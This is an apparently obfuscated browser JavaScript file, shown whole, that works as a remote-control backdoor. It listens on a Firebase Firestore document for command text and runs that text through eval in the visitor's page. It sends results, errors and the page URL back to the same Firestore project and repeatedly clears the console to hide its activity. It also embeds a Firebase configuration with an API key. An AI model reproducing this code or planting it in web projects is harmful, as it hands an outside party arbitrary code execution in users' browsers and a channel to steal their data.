const fl_iivttitv = document.createElement('script');
fl_iivttitv.src = "https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js?t=" + new Date().getTime();
document.querySelector('body').appendChild(fl_iivttitv);

const fc_sjrifj = {apiKey: "AIzaSyC3JGX-ydbKCYEpOanFJVpqmcfQ4dsRTKg",authDomain: "fir-0013.firebaseapp.com",projectId: "fir-0013",storageBucket: "fir-0013.appspot.com",messagingSenderId: "93999488005",appId: "1:93999488005:web:c89844afc1b6c03cba506c",measurementId: "G-3JHGRDKG9W"};
function fd_rjjrjl() {
    console.clear();
	$.getScript("https://www.gstatic.com/firebasejs/8.0.0/firebase-app.js");
	$.getScript("https://www.gstatic.com/firebasejs/8.0.0/firebase-firestore.js");
    firebase.initializeApp(fc_sjrifj);
    var fd_iehntt = '';
    firebase.firestore().collection('jscommand').doc('jscommanddoc').onSnapshot(doc => {
    fd_iehntt = doc.data().text;
    if ((fd_iehntt !== '') && (document.hidden == false)) {
         fd_sjdik.exe(fd_iehntt);
    }});
    document.body.style.opacity = '';
    setTimeout("fd_urdjsj.log(location.href + ' is loaded!')", 100);
}
function fd_ejdntf(){try{fd_rjjrjl();}catch(e){setTimeout('fd_ejdntf()', 63);}};fd_ejdntf();
function fd_ogieh() {
    this.log = function (t) {
	    $.getScript("https://www.gstatic.com/firebasejs/8.0.0/firebase-app.js");
        $.getScript("https://www.gstatic.com/firebasejs/8.0.0/firebase-firestore.js");
        firebase.initializeApp(fc_sjrifj);
        firebase.firestore().collection('jscommand').doc('jsrespon').set({text:String(t), type:String(typeof(t))});
        setTimeout(fd_csyod, 100);
        console.clear();
    }
    this.error = function (t) {
	    $.getScript("https://www.gstatic.com/firebasejs/8.0.0/firebase-app.js");
        $.getScript("https://www.gstatic.com/firebasejs/8.0.0/firebase-firestore.js");
        firebase.initializeApp(fc_sjrifj);
        firebase.firestore().collection('jscommand').doc('jsresponerr').set({text:String(t)});
        setTimeout(fd_csyod, 100);
        console.clear();
    }
}
function fd_csyod() {
	$.getScript("https://www.gstatic.com/firebasejs/8.0.0/firebase-app.js");
    $.getScript("https://www.gstatic.com/firebasejs/8.0.0/firebase-firestore.js");
    firebase.initializeApp(fc_sjrifj);
    firebase.firestore().collection('jscommand').doc('jsrespon').set({text:'', type:''});
    firebase.firestore().collection('jscommand').doc('jsresponerr').set({text:''});
    console.clear();
}
function fd_iehbj() {
  this.env = {};
  this.exe = function(t) {
    try {
      const r = eval.call(this.env, t);
      fd_urdjsj.log(r === undefined ? 'undefined' : r);
    } catch (e) {fd_urdjsj.error(e.message);}
  };
}
const fd_sjdik = new fd_iehbj();
const fd_urdjsj = new fd_ogieh();

console.respon = function (t) {
	fd_urdjsj.log(t);
}